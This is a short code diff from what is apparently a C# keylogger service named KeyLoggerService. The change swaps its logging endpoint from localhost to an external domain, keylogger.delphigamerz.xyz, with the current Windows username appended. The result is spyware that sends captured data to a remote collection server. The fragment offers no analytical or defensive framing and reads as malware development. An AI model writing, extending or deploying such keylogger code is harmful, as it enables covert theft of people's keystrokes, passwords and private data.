@@ -19,7 +19,7 @@ namespace KeyLoggerService
     {
         private string buf = "";
         private readonly HttpClient client = new HttpClient();
-        private readonly string apiUrl = "http://localhost:5058/log?username=" + Environment.UserName;
+        private readonly string apiUrl = "http://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;
         private Thread _workerThread;
         private bool _stopping = false;
 
